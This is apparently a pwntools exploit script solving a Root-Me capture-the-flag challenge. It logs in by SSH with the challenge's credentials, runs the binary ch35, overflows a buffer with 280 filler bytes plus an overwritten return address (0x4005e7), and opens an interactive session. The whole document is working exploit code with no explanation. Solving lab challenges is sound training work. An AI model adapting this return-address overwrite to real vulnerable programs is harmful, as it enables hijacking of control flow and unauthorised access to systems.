from pwn import *

s = ssh(host='challenge03.root-me.org',
        user='app-systeme-ch35',
        password='app-systeme-ch35',
        port=2223
        )

p = s.process('./ch35')

offset = 280

target = 0x4005e7

payload = b'A' * offset + p64(target)

p.send(payload)

p.interactive()
